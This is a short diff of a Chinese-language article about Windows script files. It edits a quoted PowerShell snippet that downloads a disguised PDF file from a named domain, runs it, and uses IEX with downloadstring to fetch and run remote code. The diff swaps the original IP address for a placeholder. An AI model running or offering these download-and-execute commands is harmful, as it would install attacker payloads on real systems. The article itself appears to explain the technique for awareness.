@@ -123,7 +123,7 @@ Windows脚本文件，也是一类可以执行的文件，[这篇文章](https:/
 ```powershell
 curl https://fastaccesone.com/load/ntc_claim.pdf -o C:\users\public\ntc_claim.pdf
 C:\users\public\ntc_claim.pdf
-IEX ((new-object net.webclient).downloadstring('http://146.70.87.120:5000/work443'))
+IEX ((new-object net.webclient).downloadstring('某美国ip'))
 ```
 
 ## 其他文件
